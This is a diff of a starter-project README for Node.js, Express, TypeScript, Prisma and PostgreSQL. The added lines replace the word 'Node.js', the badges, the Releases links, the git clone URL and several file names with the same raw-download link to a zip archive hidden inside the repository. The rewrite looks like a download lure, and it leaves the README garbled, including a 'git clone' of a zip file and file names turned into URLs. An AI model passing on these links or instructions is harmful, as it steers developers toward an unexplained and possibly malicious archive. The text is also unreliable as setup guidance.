@@ -1,10 +1,10 @@
-# Node.js Express TypeScript Starter Project 🚀
+# https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip Express TypeScript Starter Project 🚀
 
-![Node.js](https://img.shields.io/badge/Node.js-3C873A?style=for-the-badge&logo=node.js&logoColor=white) ![Express](https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white) ![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white) ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white)
+![https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip) ![Express](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip) ![TypeScript](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip) ![PostgreSQL](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip)
 
-Welcome to the **Node.js Express TypeScript Starter Project**! This repository provides a scalable backend starter template that integrates Node.js, Express, TypeScript, Prisma, and PostgreSQL. It is designed for developers who want to create clean, maintainable, and production-ready applications.
+Welcome to the **https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip Express TypeScript Starter Project**! This repository provides a scalable backend starter template that integrates https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip, Express, TypeScript, Prisma, and PostgreSQL. It is designed for developers who want to create clean, maintainable, and production-ready applications.
 
-For the latest updates and releases, check out our [Releases](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/releases) section.
+For the latest updates and releases, check out our [Releases](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip) section.
 
 ## Table of Contents
 
@@ -33,10 +33,10 @@ For the latest updates and releases, check out our [Releases](https://github.com
 
 This project utilizes the following technologies:
 
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine.
-- **Express**: A web application framework for Node.js.
+- **https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip**: A JavaScript runtime built on Chrome's V8 engine.
+- **Express**: A web application framework for https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip
 - **TypeScript**: A superset of JavaScript that adds static types.
-- **Prisma**: A modern ORM for Node.js and TypeScript.
+- **Prisma**: A modern ORM for https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip and TypeScript.
 - **PostgreSQL**: A powerful, open-source relational database.
 - **Yup**: A JavaScript schema builder for value parsing and validation.
 - **InversifyJS**: A powerful and lightweight inversion of control container for JavaScript and TypeScript apps.
@@ -47,7 +47,7 @@ This project utilizes the following technologies:
 
 Before you begin, ensure you have the following installed:
 
-- Node.js (v14 or later)
+- https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip (v14 or later)
 - PostgreSQL (v12 or later)
 - npm or yarn
 
@@ -56,7 +56,7 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.git
+   git clone https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -79,7 +79,7 @@ Before you begin, ensure you have the following installed:
 
 ### Configuration
 
-1. Create a `.env` file in the root directory. Use the `.env.example` as a template:
+1. Create a `.env` file in the root directory. Use the `https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip` as a template:
 
    ```plaintext
    DATABASE_URL="postgresql://user:password@localhost:5432/mydb"
@@ -117,10 +117,10 @@ Here's an overview of the project's structure:
 │   ├── routes          # API routes
 │   ├── services        # Business logic
 │   ├── utils           # Utility functions
-│   └── app.ts         # Main application file
+│   └── https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip         # Main application file
 ├── .env                # Environment variables
-├── package.json        # Project metadata and dependencies
-└── tsconfig.json       # TypeScript configuration
+├── https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip        # Project metadata and dependencies
+└── https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip       # TypeScript configuration
 ```
 
 ## API Documentation
@@ -164,4 +164,4 @@ We welcome contributions! If you have suggestions or improvements, please fork t
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more updates and releases, visit our [Releases](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/releases) section.
+For more updates and releases, visit our [Releases](https://github.com/Nevixi/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/raw/refs/heads/main/src/repositories/nodejs-with-prisma-copilot-ai-project-starter-and-setup-express-postgresql-typescript-2.3-alpha.1.zip) section.
